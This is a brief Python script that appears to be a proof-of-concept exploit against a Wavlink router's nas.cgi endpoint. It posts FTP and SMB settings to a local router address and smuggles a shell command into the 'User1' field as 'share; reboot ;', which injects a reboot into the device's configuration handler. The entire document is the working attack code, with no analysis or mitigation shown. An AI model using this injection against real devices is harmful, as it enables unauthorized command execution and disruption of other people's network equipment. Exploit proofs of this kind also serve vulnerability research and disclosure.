import requests

URL = "http://192.168.10.1/cgi-bin/nas.cgi"

params = {"page": "nas", "ftp_enabled": "1", "ftp_name": "WAVLINK", "ftp_anomymous": "0", "ftp_port": "21",
          "ftp_max_sessions": "10", "ftp_adddir": "1", "ftp_rename": "1", "ftp_remove": "1", "ftp_read": "1", "ftp_write": "1",
          "ftp_download": "1", "ftp_upload": "1", "smb_enabled": "1", "smb_workgroup": "WAVLINK", "smb_netbios": "wifi.wavlink.com", 
          "workgroup": "WAVLINK", "User1": "share; reboot ;", "User1Passwd": "share"}

response = requests.post(url=URL, params=params)

print(response)
